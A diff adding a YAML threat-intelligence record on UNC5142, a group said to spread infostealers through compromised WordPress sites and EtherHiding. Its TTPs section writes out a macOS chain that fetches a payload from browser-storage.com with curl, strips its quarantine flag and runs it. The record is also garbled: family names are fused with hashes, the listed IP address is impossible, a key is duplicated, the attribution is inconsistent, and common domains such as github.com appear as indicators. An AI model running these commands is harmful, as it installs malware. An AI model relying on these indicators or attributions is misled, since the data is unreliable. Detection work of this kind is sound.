@@ -1,0 +1,79 @@
+description: UNC5142 is a financially motivated threat actor that uses compromised
+  WordPress sites and the EtherHiding technique on the BNB Smart Chain to distribute
+  infostealers.
+attribution: UNC5142 (APT group), United States
+malware_families:
+- ATOMIC
+- VIDAR
+- LUMMAC.V2
+- RADTHIEF
+- bcbdb74f97092dfd68e7ec1d6770b6d1e1aae091f43bcebb0b7bce6c8188e310
+- VIDAR88019011af71af986a64f68316e80f30d3f57186aa62c3cef5ed139eb49a6842
+- VIDAR27105be1bdd9f15a1b1a2b0cc5de625e2ecd47fdeaed135321641eea86ad6cb0
+- VIDAR72d8fa46f402dcc4be78306d0535c9ace0eb9fabae59bd3ba3cc62a0bdf3db91
+- LUMMAC.V23023b0331baff73ff894087d1a425ea4b2746caf514ada624370318f27e29c2c
+- LUMMAC.V24b47b55ae448668e549ffc04e82aee41ac10e3c8b183012a105faf2360fc5ec1
+- RADTHIEF091f9db54382708327f5bb1831a4626897b6710ffe11d835724be5c224a0cf83
+- ATOMICDateCLEARSHORT
+TTPs:
+  processes: []
+  commandline:
+  - 'curl -o /tmp/update https://browser-storage.com/update'
+  - 'xattr -c /tmp/update'
+  - 'chmod +x /tmp/update'
+  - '/tmp/update'
+  powershell: []
+  scripting_engine:
+  - HTA file (remote HTML Application) with .hta extension
+  - Bash script used on macOS to download and execute ATOMIC payload
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: mshta.exe
+    destination: browser-storage.com
+    port: 443
+  - process: powershell.exe
+    destination: github.com
+    port: 443
+  - process: /tmp/update
+    destination: browser-storage.com
+    port: 443
+  file_activity:
+  - /tmp/update
+  persistence: []
+  process_relations: []
+authors:
+- Mark Magee
+- Jose Hernandez
+- Bavi Sadayappan
+- Jessa Valdez
+- Cian Lynch
+- Blas Kojusner
+- Geoff Ackerman
+- Muhammad Umer Khan
+- Elvis Miezitis
+- Yash Gupta
+- Diana Ion
+- Mandiant
+IOCs:
+  hashes:
+  - bcbdb74f97092dfd68e7ec1d6770b6d1e1aae091f43bcebb0b7bce6c8188e310
+  ips:
+  - 280.64.30.238
+  domains:
+  - browser-storage.com
+  - mediafire.com
+  - github.com
+  - cloudflare.pages.dev
+  - pages.dev
+  - cloudflare.com
+  urls:
+  - https://browser-storage.com/update
+authors:
+- Mark Magee
+- Jose Hernandez
+- Bavi Sadayappan
+- Jessa Valdez
+reference: https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware
+date_of_publication: October 16, 2025
+file_creation_date: October 17, 2025
